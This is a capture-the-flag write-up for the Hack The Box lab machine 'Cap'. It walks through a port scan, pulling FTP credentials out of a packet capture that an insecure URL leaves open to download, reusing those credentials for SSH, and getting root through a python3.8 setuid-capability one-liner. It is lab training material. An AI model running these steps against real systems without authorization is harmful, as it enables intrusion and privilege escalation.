
![](Pasted%20image%2020241201195858.png)

# Enumeration

Performing port scan.

```
┌──[hexadivine@hackthebox]─[~]
└──╼ $ sudo nmap -sS -T5 -p- -r cap.htb -v | grep open
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 22/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
```

Checking the website. This allows us to download the pcap file.

![](Pasted%20image%2020241201202244.png)

We can download multiple pcap files from <http://cap.htb/data/2>, <http://cap.htb/data/3> etc.  

![](Pasted%20image%2020241201202412.png)

However pcap file from <http://cap.htb/data/0> has some sensitive data that I viewed using wireshark.

![](Pasted%20image%2020241201202618.png)

`0.pcap` file contains sensitive data.

![](Pasted%20image%2020241201202824.png)

This FTP username and password can also be used for ssh. Entering to ssh. 

```
┌──[hexadivine@hackthebox]─[~/ctf/tmp]
└──╼ $ ssh nathan@cap.htb
The authenticity of host 'cap.htb (10.10.10.245)' can't be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cap.htb' (ED25519) to the list of known hosts.
nathan@cap.htb's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

nathan@cap:~$ ls
user.txt

nathan@cap:~$ cat user.txt 
228a68da7cb3f43a269f6a9c9c913---
```

# Privilege Escalation

This machine has linux capabilities exploit. 

```
nathan@cap:~$ getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

`getcap` file showing `cap_setuid` set for `/usr/bin/python3.8` which is vulnerable to privilege escalation. ([click here](https://gtfobins.github.io/gtfobins/python/#capabilities))

![](Pasted%20image%2020241201204435.png)

```
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# find / -name *root.txt  2>/dev/null
/root/root.txt
# cat /root/root.txt
a7b22b5ea65a484b4c197eb5db5ac---
```

And we are ROOT.